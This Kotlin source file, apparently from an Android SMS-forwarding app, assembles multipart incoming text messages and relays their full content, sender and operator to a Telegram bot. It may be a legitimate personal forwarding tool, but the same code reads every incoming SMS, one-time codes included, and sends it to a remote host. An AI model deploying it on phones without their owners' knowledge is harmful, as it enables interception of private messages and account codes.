package ru.pushtoweb.app

import android.content.Context
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.util.concurrent.ConcurrentHashMap

object SmsAssembler {
    private val scope = CoroutineScope(Dispatchers.IO)
    private val bufferMap = ConcurrentHashMap<String, SmsPendingMessage>()

    private class SmsPendingMessage(
        val context: Context,
        val sender: String,
        val textBuilder: StringBuilder,
        val operator: String,
        var debounceJob: Job? = null
    )

    fun onSmsReceived(
        context: Context,
        sender: String,
        text: String,
        operator: String
    ) {
        val cleanSender = sender.trim().ifEmpty { "SMS" }
        synchronized(bufferMap) {
            val existing = bufferMap[cleanSender]
            if (existing != null) {
                existing.debounceJob?.cancel()
                existing.textBuilder.append(text)
                existing.debounceJob = scope.launch {
                    delay(1200) // 1.2s wait for any extra multipart segments
                    flush(cleanSender)
                }
            } else {
                val pending = SmsPendingMessage(
                    context = context.applicationContext,
                    sender = cleanSender,
                    textBuilder = StringBuilder(text),
                    operator = operator
                )
                bufferMap[cleanSender] = pending
                pending.debounceJob = scope.launch {
                    delay(1200) // 1.2s debounce
                    flush(cleanSender)
                }
            }
        }
    }

    private fun flush(sender: String) {
        val pending = synchronized(bufferMap) {
            bufferMap.remove(sender)
        } ?: return

        val fullText = pending.textBuilder.toString().trim()
        if (fullText.isEmpty()) return

        // 1. Record in RecentMessageCache to prevent duplicate push from SMS apps
        RecentMessageCache.recordSentSms(pending.sender, fullText)

        // 2. Ensure Telegram bot configuration is loaded
        TelegramSender.ensureConfigLoaded(pending.context)

        // 3. Send the assembled SMS to Telegram
        TelegramSender.forwardPayloadSync(
            type = "sms",
            sender = pending.sender,
            text = fullText,
            appName = "SMS",
            packageName = "com.android.sms",
            operator = pending.operator
        )
    }
}
